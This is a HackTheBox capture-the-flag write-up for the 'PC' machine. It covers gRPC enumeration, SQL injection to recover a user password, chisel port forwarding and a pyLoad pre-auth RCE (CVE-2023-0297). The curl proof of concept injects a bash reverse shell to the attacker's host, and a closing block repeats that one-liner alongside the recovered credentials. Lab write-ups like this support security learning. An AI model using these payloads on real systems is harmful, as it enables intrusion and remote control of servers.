# HackTheBox - PC

## NMAP

```bash
Nmap scan report for 10.129.19.240                     
Host is up (0.21s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:         
|   3072 91bf44edea1e3224301f532cea71e5ef (RSA)
|   256 8486a6e204abdff71d456ccf395809de (ECDSA)
|_  256 1aa89572515e8e3cf180f542fd0a281c (ED25519)
50051/tcp open  unknown          
```

## PORT 50051

Connecting to this port through `telnet` or `netcat`, doesn't yield anything but `???`

<img src="https://i.imgur.com/BMLSNEy.png"/>

So resarching what runs on port 50051 shows that, gRPC uses this port which is an open source remote procedure call framework by google

<img src="https://i.imgur.com/o3nfU5j.png"/>

We can analyze the traffic through `wireshark` by sniffing packets on our interface (tun0) and changing protocol to HTTP/2

<img src="https://i.imgur.com/JBQgkal.png"/>

gRPC can be enumerated through `grpcurl`

```bash
grpcurl -plaintext 10.129.19.240:50051 list
```

<img src="https://i.imgur.com/AdXPsBb.png"/>

This listed two services, let's try listing the methods in `SimpleApp`

<img src="https://i.imgur.com/GSXeb8S.png"/>

SimpleApp service has three methods which can be checked with `describe` arguement

<img src="https://i.imgur.com/EEpsahj.png"/>

We can register and login with an account which in return provides an id 

```bash
grpcurl -plaintext -d '{"username":"arz101" , "password":"12345"}' 10.129.19.240:50051 SimpleApp/RegisterUser 

grpcurl -plaintext -d '{"username":"arz101" , "password":"12345"}' 10.129.19.240:50051 SimpleApp/LoginUser
```


<img src="https://i.imgur.com/GDvCLBK.png"/>

Now using `getInfo` will ask for a token

<img src="https://i.imgur.com/ROsqUow.png"/>

## Foothold

If we go back to login method, we do use a token if we enable verbosity with `-vv`

<img src="https://i.imgur.com/HiQulEp.png"/>

```bash
grpcurl -vv -plaintext -H "token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYXJ6MTAxIiwiZXhwIjoxNjg0NjkzODY1fQ.CMWWeEN92nUfwMh8_AUGBPjHsIC7oIRTVDBZEy2qDS8" 10.129.19.240:50051 SimpleApp/getInfo
```

<img src="https://i.imgur.com/jmZ4eNA.png"/>
This gives us an error `Unexpected <class 'TypeError'>: bad argument type for built-in operation` due to we haven't specified the data, if we use `describe` to see what parameters the method accepts

<img src="https://i.imgur.com/LypYf33.png"/>

It needs the ID which we get after logging in

```bash
grpcurl -vv -plaintext -H "token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYXJ6MTAxIiwiZXhwIjoxNjg0NjkzODY1fQ.CMWWeEN92nUfwMh8_AUGBPjHsIC7oIRTVDBZEy2qDS8" -d '{"id": "842"}' 10.129.19.240:50051 SimpleApp/getInfo

```

<img src="https://i.imgur.com/k8qDJqW.png"/>

But tampering/playing around with this was a little difficult, so I tried postman and grpcui which gives you GUI with which you can work with gRPC service and also intercept the requests easily

<img src="https://i.imgur.com/eksI8QX.png"/>

<img src="https://i.imgur.com/XAwU5kQ.png"/>

<img src="https://i.imgur.com/5ypgqSi.png"/>

<img src="https://i.imgur.com/jjytNag.png"/>


After identifiying that it was using some filters for sqli, we can try running `sqlmap` which found injection on `id` parameter

<img src="https://i.imgur.com/ZyxW1y5.png"/>

<img src="https://i.imgur.com/Tc2hAjK.png"/>

With these credentials, we can login as `sau` user

<img src="https://i.imgur.com/2R02n7N.png"/>

Having enumerated the SUIDs, the files which are owned sau none of them yield any path to escalation, checking the local ports, there was port 8000 open which redirects to a login page

<img src="https://i.imgur.com/bJep6gx.png"/>

<img src="https://i.imgur.com/oh5YJff.png"/>

Port forwarding with `chisel`

```bash
chisel server -p 3333 --reverse

chisel client 10.10.16.19:3333 R:localhost:8000
```

<img src="https://i.imgur.com/73nLYMT.png"/>

Now accessing the port on our browser we'll get a login page for pyLoad which is a download manager for python


<img src="https://i.imgur.com/GgFEXZF.png"/>

Trying the default creds like `admin:admin` and `pyload:pyload` didn't work, so searching for CVEs there was a pre-auth rce vulnerability (CVE-2023-0297)

<img src="https://i.imgur.com/SdNEqLy.png"/>

Using the poc we'll get a shell as the root user

```bash
curl -i -s -k -X $'POST' \
    --data-binary $'jk=pyimport%20os;os.system(\"%2Fbin%2Fbash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E16%2E19%2F2222%200%3E%261%27\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    $'http://localhost:8000/flash/addcrypted2'
```

<img src="https://i.imgur.com/fOYBuSy.png"/>

## References

- https://grpc.io/blog/wireshark/
- https://github.com/fullstorydev/grpcurl
- https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9
- https://security.snyk.io/vuln/SNYK-PYTHON-PYLOADNG-3230895
- https://security.snyk.io/vuln/SNYK-PYTHON-PYLOADNG-3230895


```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYXJ6MTAxIiwiZXhwIjoxNjg0Njk4MTcwfQ.mPfP5ci6uGoO0h0p8L5PlI0w48RFy4WD97G1COkbWEo
113
HereIsYourPassWord1431:sau
bash -i >& /dev/tcp/10.10.16.19/2222 0>&1
```
